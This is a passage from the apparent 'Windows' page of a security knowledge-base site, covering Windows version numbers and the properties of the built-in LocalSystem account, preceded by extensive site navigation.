



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
    
    
      
        <title>Windows - Security Knowledge Base</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/application.1b62728e.css">
      
      
    
    
      <script src="../../assets/javascripts/modernizr.268332fc.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../../_site/extra.css">
    
    
      
    
    
  </head>
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#quick-references" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="../.." title="Security Knowledge Base" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Security Knowledge Base
            </span>
            <span class="md-header-nav__topic">
              
                Windows
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="../.." title="Security Knowledge Base" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    Security Knowledge Base
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../.." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../apt/" title="APT" class="md-nav__link">
      APT
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../books/" title="Books" class="md-nav__link">
      Books
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../bug-hunting/" title="Bug hunting" class="md-nav__link">
      Bug hunting
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../career/" title="Career" class="md-nav__link">
      Career
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../crypto/" title="Crypto" class="md-nav__link">
      Crypto
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../databases-sqlserver/" title="Databases - SqlServer" class="md-nav__link">
      Databases - SqlServer
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../databases/" title="Databases" class="md-nav__link">
      Databases
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../defense/" title="Defense" class="md-nav__link">
      Defense
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../dfir/" title="DFIR" class="md-nav__link">
      DFIR
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../embedded-and-iot/" title="Embedded and iot" class="md-nav__link">
      Embedded and iot
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../exploits_and_shellcoding/" title="Exploits and shellcoding" class="md-nav__link">
      Exploits and shellcoding
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../iam-kerberos/" title="IAM - Kerberos" class="md-nav__link">
      IAM - Kerberos
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../iam/" title="IAM" class="md-nav__link">
      IAM
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../languages/" title="Languages" class="md-nav__link">
      Languages
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../linux-issues/" title="Linux issues" class="md-nav__link">
      Linux issues
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../linux/" title="Linux" class="md-nav__link">
      Linux
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../malware/" title="Malware" class="md-nav__link">
      Malware
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../non-security/" title="Z Non Security" class="md-nav__link">
      Z Non Security
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../operating-systems/" title="Operating systems" class="md-nav__link">
      Operating systems
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../osint/" title="OSINT" class="md-nav__link">
      OSINT
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../password-attacks/" title="Password attacks" class="md-nav__link">
      Password attacks
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../ports-and-protocols/" title="Ports and protocols" class="md-nav__link">
      Ports and protocols
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../red-blue-team/" title="Red blue team" class="md-nav__link">
      Red blue team
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../reverse-engineering/" title="Reverse engineering" class="md-nav__link">
      Reverse engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../rf-and-sdr/" title="RF and SDR" class="md-nav__link">
      RF and SDR
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../social-engineering/" title="Social engineering" class="md-nav__link">
      Social engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../steganography/" title="Steganography" class="md-nav__link">
      Steganography
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../vulnerable/" title="Vulnerable" class="md-nav__link">
      Vulnerable
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../wifi/" title="WiFi" class="md-nav__link">
      WiFi
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-34" type="checkbox" id="nav-34">
    
    <label class="md-nav__link" for="nav-34">
      Certifications
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-34">
        Certifications
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/cissp/" title="CISSP" class="md-nav__link">
      CISSP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/osce/" title="OSCE" class="md-nav__link">
      OSCE
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-34-3" type="checkbox" id="nav-34-3">
    
    <label class="md-nav__link" for="nav-34-3">
      Oscp
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-34-3">
        Oscp
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/0-cheatsheet/" title="Enumeration" class="md-nav__link">
      Enumeration
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/_collections/" title="collections" class="md-nav__link">
       collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/_preparation/" title="Was checking" class="md-nav__link">
      Was checking
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/lab-setup/" title="Lab Setup" class="md-nav__link">
      Lab Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/notes/" title="Notes" class="md-nav__link">
      Notes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/practice-vulnhub/" title="Practice" class="md-nav__link">
      Practice
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/setup/" title="Setup" class="md-nav__link">
      Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-34-3-9" type="checkbox" id="nav-34-3-9">
    
    <label class="md-nav__link" for="nav-34-3-9">
      Cheatsheet
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-34-3-9">
        Cheatsheet
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/0-cheatsheet/" title="Cheatsheets" class="md-nav__link">
      Cheatsheets
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/download/" title="Download" class="md-nav__link">
      Download
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/exploits/" title="Exploits" class="md-nav__link">
      Exploits
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/share-files/" title="Share files" class="md-nav__link">
      Share files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/shell/" title="Bash" class="md-nav__link">
      Bash
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/tty/" title="TTY" class="md-nav__link">
      TTY
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-34-3-9-10" type="checkbox" id="nav-34-3-9-10">
    
    <label class="md-nav__link" for="nav-34-3-9-10">
      Enumeration
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-34-3-9-10">
        Enumeration
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/enumeration/network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/enumeration/vulnerability/" title="Vulnerability" class="md-nav__link">
      Vulnerability
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/enumeration/windows-local/" title="Windows local" class="md-nav__link">
      Windows local
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-35" type="checkbox" id="nav-35">
    
    <label class="md-nav__link" for="nav-35">
      Cloud
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-35">
        Cloud
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../cloud/aws/" title="Aws" class="md-nav__link">
      Aws
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../cloud/azuer-o360/" title="Azuer o360" class="md-nav__link">
      Azuer o360
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../cloud/general/" title="General" class="md-nav__link">
      General
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-36" type="checkbox" id="nav-36">
    
    <label class="md-nav__link" for="nav-36">
      Devops
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-36">
        Devops
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../devops/container/" title="Container" class="md-nav__link">
      Container
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../devops/docker/" title="Docker" class="md-nav__link">
      Docker
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../devops/istio/" title="Istio" class="md-nav__link">
      Istio
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../devops/kubernetes/" title="Kubernetes" class="md-nav__link">
      Kubernetes
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-37" type="checkbox" id="nav-37" checked>
    
    <label class="md-nav__link" for="nav-37">
      Windows
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-37">
        Windows
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../active-directory/" title="Active Directory" class="md-nav__link">
      Active Directory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../powershell/" title="Powershell" class="md-nav__link">
      Powershell
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows-issues/" title="Windows issues" class="md-nav__link">
      Windows issues
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows-privilege-escalation/" title="Windows Privilege Escalation" class="md-nav__link">
      Windows Privilege Escalation
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Windows
      </label>
    
    <a href="./" title="Windows" class="md-nav__link md-nav__link--active">
      Windows
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#quick-references" class="md-nav__link">
    Quick References
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bypasses" class="md-nav__link">
    Bypasses
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tools" class="md-nav__link">
    Tools
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#mimikatz" class="md-nav__link">
    Mimikatz
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#psexec" class="md-nav__link">
    PsExec
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#important-endpoints" class="md-nav__link">
    Important Endpoints
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#registry" class="md-nav__link">
    Registry
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#credentials" class="md-nav__link">
    Credentials
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#using-credentials" class="md-nav__link">
    Using Credentials
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#general-exploits" class="md-nav__link">
    General Exploits
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#post-exploitation" class="md-nav__link">
    Post Exploitation
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#important-files" class="md-nav__link">
    Important Files
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#special-file-handling" class="md-nav__link">
    Special File Handling
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#important-processes" class="md-nav__link">
    Important Processes
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-api" class="md-nav__link">
    Windows API
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#wmi" class="md-nav__link">
    WMI
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#interesting-cim-classes" class="md-nav__link">
    Interesting CIM classes
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mof-managed-object-format" class="md-nav__link">
    MOF (Managed Object Format)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploring" class="md-nav__link">
    Exploring
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#interesting-queries" class="md-nav__link">
    Interesting Queries
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#useful-wmi-classes" class="md-nav__link">
    Useful WMI Classes
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tools_1" class="md-nav__link">
    Tools
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remoting" class="md-nav__link">
    Remoting
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#access-registry" class="md-nav__link">
    Access Registry
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#applocker" class="md-nav__link">
    AppLocker
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hyperv" class="md-nav__link">
    HyperV
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#events" class="md-nav__link">
    Events
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#defense" class="md-nav__link">
    Defense
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references_1" class="md-nav__link">
    References
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#kernel" class="md-nav__link">
    Kernel
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#random" class="md-nav__link">
    Random
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#quick-references" class="md-nav__link">
    Quick References
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bypasses" class="md-nav__link">
    Bypasses
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tools" class="md-nav__link">
    Tools
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#mimikatz" class="md-nav__link">
    Mimikatz
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#psexec" class="md-nav__link">
    PsExec
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#important-endpoints" class="md-nav__link">
    Important Endpoints
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#registry" class="md-nav__link">
    Registry
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#credentials" class="md-nav__link">
    Credentials
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#using-credentials" class="md-nav__link">
    Using Credentials
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#general-exploits" class="md-nav__link">
    General Exploits
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#post-exploitation" class="md-nav__link">
    Post Exploitation
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#important-files" class="md-nav__link">
    Important Files
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#special-file-handling" class="md-nav__link">
    Special File Handling
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#important-processes" class="md-nav__link">
    Important Processes
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-api" class="md-nav__link">
    Windows API
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#wmi" class="md-nav__link">
    WMI
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#interesting-cim-classes" class="md-nav__link">
    Interesting CIM classes
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mof-managed-object-format" class="md-nav__link">
    MOF (Managed Object Format)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploring" class="md-nav__link">
    Exploring
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#interesting-queries" class="md-nav__link">
    Interesting Queries
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#useful-wmi-classes" class="md-nav__link">
    Useful WMI Classes
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tools_1" class="md-nav__link">
    Tools
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remoting" class="md-nav__link">
    Remoting
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#access-registry" class="md-nav__link">
    Access Registry
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#applocker" class="md-nav__link">
    AppLocker
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hyperv" class="md-nav__link">
    HyperV
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#events" class="md-nav__link">
    Events
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#defense" class="md-nav__link">
    Defense
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references_1" class="md-nav__link">
    References
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#kernel" class="md-nav__link">
    Kernel
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#random" class="md-nav__link">
    Random
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                  <h1>Windows</h1>
                
                <h2 id="quick-references">Quick References<a class="headerlink" href="#quick-references" title="Permanent link">&para;</a></h2>
<ul>
<li>Commands &amp; prevesc: <a href="https://guif.re/windowseop">https://guif.re/windowseop</a></li>
<li>VMs: <a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/">https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/</a></li>
<li>Versions 
    <div class="codehilite"><pre><span></span><span class="nv">Windows</span> <span class="mi">1</span>.<span class="mi">0</span>                    <span class="mi">1</span>.<span class="mi">04</span>
<span class="nv">Windows</span> <span class="mi">2</span>.<span class="mi">0</span>                    <span class="mi">2</span>.<span class="mi">11</span>
<span class="nv">Windows</span> <span class="mi">3</span>.<span class="mi">0</span>                    <span class="mi">3</span>
<span class="nv">Windows</span> <span class="nv">NT</span> <span class="mi">3</span>.<span class="mi">1</span>                 <span class="mi">3</span>.<span class="mi">10</span>.<span class="mi">528</span>
<span class="nv">Windows</span> <span class="k">for</span> <span class="nv">Workgroups</span> <span class="mi">3</span>.<span class="mi">11</span>    <span class="mi">3</span>.<span class="mi">11</span>
<span class="nv">Windows</span> <span class="nv">NT</span> <span class="nv">Workstation</span> <span class="mi">3</span>.<span class="mi">5</span>     <span class="mi">3</span>.<span class="mi">5</span>.<span class="mi">807</span>
<span class="nv">Windows</span> <span class="nv">NT</span> <span class="nv">Workstation</span> <span class="mi">3</span>.<span class="mi">51</span>    <span class="mi">3</span>.<span class="mi">51</span>.<span class="mi">1057</span>
<span class="nv">Windows</span> <span class="mi">95</span>                     <span class="mi">4</span>.<span class="mi">0</span>.<span class="mi">950</span>
<span class="nv">Windows</span> <span class="nv">NT</span> <span class="nv">Workstation</span> <span class="mi">4</span>.<span class="mi">0</span>     <span class="mi">4</span>.<span class="mi">0</span>.<span class="mi">1381</span>
<span class="nv">Windows</span> <span class="mi">98</span>                     <span class="mi">4</span>.<span class="mi">1</span>.<span class="mi">1998</span>
<span class="nv">Windows</span> <span class="mi">98</span> <span class="nv">Second</span> <span class="nv">Edition</span>      <span class="mi">4</span>.<span class="mi">1</span>.<span class="mi">2222</span>
<span class="nv">Windows</span> <span class="nv">Me</span>                     <span class="mi">4</span>.<span class="mi">90</span>.<span class="mi">3000</span>
<span class="nv">Windows</span> <span class="mi">2000</span> <span class="nv">Professional</span>      <span class="mi">5</span>.<span class="mi">0</span>.<span class="mi">2195</span>
<span class="nv">Windows</span> <span class="nv">XP</span>                     <span class="mi">5</span>.<span class="mi">1</span>.<span class="mi">2600</span>
<span class="nv">Windows</span> <span class="nv">Vista</span>                  <span class="mi">6</span>.<span class="mi">0</span>.<span class="mi">6000</span>
<span class="nv">Windows</span> <span class="mi">7</span>                      <span class="mi">6</span>.<span class="mi">1</span>.<span class="mi">7600</span>
<span class="nv">Windows</span> <span class="mi">8</span>.<span class="mi">1</span>                    <span class="mi">6</span>.<span class="mi">3</span>.<span class="mi">9600</span>
<span class="nv">Windows</span> <span class="mi">10</span>                     <span class="mi">10</span>.<span class="mi">0</span>.<span class="mi">10240</span>
</pre></div></li>
<li>User Accounts<ul>
<li>LocalSystem account is a predefined local account used by the service control manager. <ul>
<li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684190(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/ms684190(v=vs.85).aspx</a></li>
<li>Very high-privileged built-in account.</li>
<li>Extensive privileges on the local system and acts as the computer on the network. </li>
<li>The actual name of the account is <code class="codehilite"><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="err">\</span><span class="k">SYSTEM</span></code>.</li>
<li>Not recognized by the security subsystem, so you cannot specify its name in a call to the <code class="codehilite"><span class="n">LookupAccountName</span></code> function. </li>
<li>Has extensive privileges on the local computer, and acts as the computer on the network. </li>
<li>Its token includes the <code class="codehilite"><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="err">\</span><span class="k">SYSTEM</span></code> and <code class="codehilite"><span class="n">BUILTIN</span><span class="err">\</span><span class="n">Administrators</span></code> SIDs; these accounts have access to most system objects. </li>
<li>The name of the account in all locales is <code class="codehilite"><span class="p">.</span><span class="err">\</span><span class="n">LocalSystem</span></code>. </li>
<li>The name, <code class="codehilite"><span class="n">LocalSystem</span></code> or <code class="codehilite"><span class="n">ComputerName</span><span class="err">\</span><span class="n">LocalSystem</span></code> can also be used. </li>
<li>This account does not have a password. </li>
